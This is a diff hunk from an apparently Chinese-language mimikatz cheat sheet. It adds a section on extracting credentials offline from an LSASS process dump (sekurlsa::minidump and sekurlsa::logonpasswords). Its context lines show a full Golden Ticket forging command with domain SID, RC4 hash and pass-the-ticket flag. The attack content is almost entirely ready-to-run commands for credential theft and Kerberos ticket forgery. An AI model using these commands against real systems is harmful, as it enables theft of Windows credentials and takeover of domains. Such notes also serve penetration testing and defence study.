@@ -57,6 +57,15 @@
 9. 生成Golden Ticket
 10. `kerberos::golden /domain:pavan.loc /sid:S-1-5-21-97841242-3460736137-492355079 /rc4:e847d2e54044172830e3e3a6b8438853 /user:Hacker /id:500 /ptt`
 
+### 本地破解进程镜像 lsass
+
+```
+mimikatz # sekurlsa::minidump lsass.dump
+mimikatz # sekurlsa::logonpasswords
+```
+
+
+
 ### **破解扫雷游戏**
 
 `minesweeper::infos`
